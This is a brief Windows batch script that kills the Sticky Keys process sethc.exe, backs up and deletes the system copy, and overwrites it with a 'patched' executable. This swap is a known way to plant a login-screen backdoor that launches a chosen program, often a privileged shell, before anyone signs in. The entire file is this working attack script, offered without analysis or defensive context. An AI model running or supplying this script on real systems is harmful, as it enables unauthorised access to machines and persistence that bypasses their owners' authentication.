@echo off
color f0
if "%~1"=="yes" goto :Script
set "var69=Yes"&call start "" "%~0" yes&exit
:script
echo Killing Sethc.exe Process...
taskkill /f /im sethc.exe >nul 2>&1
echo.
echo Backing Up Sethc.exe...
copy "C:\windows\system32\sethc.exe" "C:\windows\system32\sethc_Unpatched.exe"
echo.
echo Deleting Sethc.exe...
del "C:\windows\system32\sethc.exe"
echo.
echo Copying Patched Sethc.exe
if not exist "sethc_P_A_T_C_H.exe" (set /p "sethcPatched=Enter patched sethc.exe location : ") else (set sethcPatched=sethc_P_A_T_C_H.exe)
copy /Y "%sethcPatched%" "C:\windows\system32\sethc.exe"
echo.
echo Patched successfully, unless there are errors above :)
pause